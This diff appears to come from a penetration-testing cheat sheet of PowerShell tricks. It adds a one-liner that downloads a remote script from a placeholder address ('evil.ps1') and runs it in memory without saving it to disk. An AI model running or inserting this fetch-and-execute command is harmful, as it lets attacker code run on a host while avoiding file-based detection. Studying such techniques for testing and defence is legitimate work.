@@ -4,10 +4,16 @@
 
 ## Powershell
 
-#### Executing a file without an extension
+#### Executing a script without an extension
 
 ```text
 powershell - < ps1file
+```
+
+#### Executing a script without downloading a file
+
+```text
+iex (new-object net.webclient).downloadstring('http://192.168.0.1/evil.ps1')
 ```
 
 [http://pwnwiki.io/\#!presence/windows/blind.md](http://pwnwiki.io/#!presence/windows/blind.md)
